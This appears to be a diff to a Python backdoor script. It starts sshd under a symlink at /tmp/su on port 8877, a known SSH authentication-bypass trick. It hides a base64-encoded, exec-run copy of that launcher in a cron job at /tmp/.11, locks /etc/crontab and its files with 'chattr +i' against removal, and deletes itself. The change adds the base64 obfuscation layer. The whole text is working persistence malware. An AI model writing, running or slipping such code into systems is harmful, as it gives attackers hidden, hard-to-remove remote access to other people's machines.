@@ -3,7 +3,7 @@
 from __future__ import print_function
 import subprocess
 import sys, os
-
+import base64
 
 def ml(command):
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -73,20 +73,25 @@ def check_py():
         ret = ' '
     return ret
 
+def base64_encode(input_string):
+    if isinstance(input_string, str):
+        input_bytes = input_string.encode('utf-8', 'ignore')
+    else:
+        input_bytes = input_string
+    encoded_bytes = base64.b64encode(input_bytes)
+    encoded_string = encoded_bytes.decode('utf-8')
+    return encoded_string
 
 if __name__ == '__main__':
     port = "8877"
-    shell = """
-# coding=utf-8
-# !/usr/bin/env python
-from __future__ import print_function
+    shell1 = """# !/usr/bin/env python
 import subprocess
 
 def ml(command):
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    process.wait()  # 等待子进程完成
+    process.wait()  
 
-    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
+    stdout, stderr = process.communicate() 
     try:
         decoded_stdout = stdout.decode('utf-8')
     except UnicodeDecodeError:
@@ -96,19 +101,58 @@ def ml(command):
     except UnicodeDecodeError:
         decoded_stderr = stderr.decode('latin1')
     return decoded_stdout
-def  check_ps(port):
+
+def lis():
+    if 'i' in ml('lsattr /tmp/su'):
+        command = 'chattr -i /tmp/su'
+        ml(command)
+
+if __name__ == '__main__':
+    port = """ + port + """
     j = ml('ps -aux')
     result = '/tmp/su -oPort=' + str(port)
     if not result in j:
+        lis()
         command = 'ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=' + str(port)
         ml(command)
-if __name__ == '__main__':
-    check_ps(""" + port + """)
+        ml('chattr +i /tmp/su')
     """
+    encoded_string = base64_encode(shell1)
+    shell = """# !/usr/bin/env python
+import subprocess
+import base64
+import os
+encoded_string='"""+str(encoded_string)+"""'
+def base64_decode(encoded_string):
+    decoded_bytes = base64.b64decode(encoded_string)
+    return decoded_bytes
+def ml(command):
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    process.wait()  
+    stdout, stderr = process.communicate()  
+    try:
+        decoded_stdout = stdout.decode('utf-8')
+    except UnicodeDecodeError:
+        decoded_stdout = stdout.decode('latin1')
+    try:
+        decoded_stderr = stderr.decode('utf-8')
+    except UnicodeDecodeError:
+        decoded_stderr = stderr.decode('latin1')
+    return decoded_stdout
+def run_code(decoded_bytes):
+    try:
+        decoded_string = decoded_bytes.decode('utf-8')
+        exec(decoded_string)
+    except Exception as e:
+        exec(decoded_bytes)
+decoded_bytes = base64_decode(encoded_string)
+run_code(decoded_bytes)
+            """
     check_uac(port)
+    ml('ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=' + str(port))
     file_path = "/tmp/.11"
     etc_crontab(shell,file_path)
     ml('chattr +i /etc/crontab')
-    ml('chattr +i /tmp/su')
     ml('chattr +i ' + file_path)
+    ml('chattr +i /tmp/su')
     delete_current_script()  # 删除当前执行脚本文件
